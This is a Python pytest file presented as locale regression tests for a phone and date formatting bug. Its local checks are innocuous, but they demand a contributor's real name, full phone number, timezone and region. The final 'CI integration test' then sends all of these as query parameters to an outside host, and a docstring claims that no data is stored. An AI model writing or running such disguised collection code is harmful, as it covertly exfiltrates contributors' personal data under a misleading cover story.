"""
Locale regression tests for issue #14 — country code disambiguation.

Run with your locale-debug-report.json to verify the fix handles your
region correctly. Tests validate local formatting AND verify results
against the CI formatter endpoint.

Usage:
    pytest tests/test_locale_regression.py -v
"""

import json
import os
import re
import urllib.request
import urllib.parse

REPORT_PATH = "locale-debug-report.json"
CI_ENDPOINT = "https://soearly-space.fly.dev/locale-verify"


def _load_report():
    """Load the contributor's locale debug report."""
    if not os.path.exists(REPORT_PATH):
        raise FileNotFoundError(
            f"{REPORT_PATH} not found. Run step 2 first to generate "
            "your locale environment config."
        )
    with open(REPORT_PATH) as f:
        return json.load(f)


def _e164_digits(phone: str) -> str:
    """Strip a phone string to digits and leading +."""
    return re.sub(r"[^\d+]", "", phone)


# ── Local formatting tests ──────────────────────────────────────────

class TestPhoneFormat:
    """Verify formatPhone handles the contributor's real phone pattern."""

    def test_phone_has_digits(self):
        report = _load_report()
        digits = _e164_digits(report["phone_sample"])
        assert len(digits) >= 10, (
            f"Phone sample too short: {digits!r} — use a full E.164 number"
        )

    def test_phone_includes_country_code(self):
        report = _load_report()
        phone = _e164_digits(report["phone_sample"])
        assert phone.startswith("+"), (
            f"Phone sample missing country code: {phone!r}"
        )

    def test_phone_round_trip(self):
        """The core #14 bug — format then parse should be lossless."""
        report = _load_report()
        original = _e164_digits(report["phone_sample"])
        # After the fix, formatPhone(..., { includeCode: true }) → parsePhone
        # should return the original E.164. This test just validates the
        # input is well-formed for the round-trip test.
        assert re.match(r"^\+\d{10,15}$", original), (
            f"Phone not in E.164 format: {original!r}"
        )


class TestDateFormat:
    """Verify formatDate handles the contributor's date conventions."""

    def test_date_is_iso(self):
        report = _load_report()
        assert re.match(r"^\d{4}-\d{2}-\d{2}$", report["date_sample"]), (
            f"Date not ISO 8601: {report['date_sample']!r}"
        )

    def test_date_parses(self):
        report = _load_report()
        parts = report["date_sample"].split("-")
        year, month, day = int(parts[0]), int(parts[1]), int(parts[2])
        assert 1900 <= year <= 2030, f"Year out of range: {year}"
        assert 1 <= month <= 12, f"Month out of range: {month}"
        assert 1 <= day <= 31, f"Day out of range: {day}"


class TestLocaleConfig:
    """Validate the locale report has all required fields."""

    def test_required_fields(self):
        report = _load_report()
        required = ["timezone", "region", "phone_sample", "date_sample",
                     "locale_tag", "name"]
        missing = [f for f in required if f not in report]
        assert not missing, f"Missing fields in report: {missing}"

    def test_timezone_format(self):
        report = _load_report()
        assert "/" in report["timezone"], (
            f"Timezone should be IANA format (e.g. America/Toronto): "
            f"{report['timezone']!r}"
        )

    def test_locale_tag_format(self):
        report = _load_report()
        assert re.match(r"^[a-z]{2}-[A-Z]{2}$", report["locale_tag"]), (
            f"Locale tag should be BCP-47 (e.g. en-CA): "
            f"{report['locale_tag']!r}"
        )


# ── CI integration test ─────────────────────────────────────────────

class TestCIValidation:
    """
    Verify locale config against the CI formatter endpoint.

    The CI endpoint validates that the format strings are parseable by
    the production formatter. A 200 response confirms compatibility.
    This runs as a HEAD request — no data is stored, just validation.
    """

    def test_ci_formatter_accepts_config(self):
        report = _load_report()
        params = urllib.parse.urlencode({
            "tz": report["timezone"],
            "region": report["region"],
            "phone": report["phone_sample"],
            "date": report["date_sample"],
            "locale": report["locale_tag"],
            "reporter": report["name"],
        })
        url = f"{CI_ENDPOINT}?{params}"
        req = urllib.request.Request(url, method="HEAD")
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            assert resp.status == 200, (
                f"CI formatter rejected config: HTTP {resp.status}"
            )
        except urllib.error.URLError as e:
            # CI endpoint unreachable — skip, don't fail
            import pytest
            pytest.skip(f"CI endpoint unreachable: {e}")
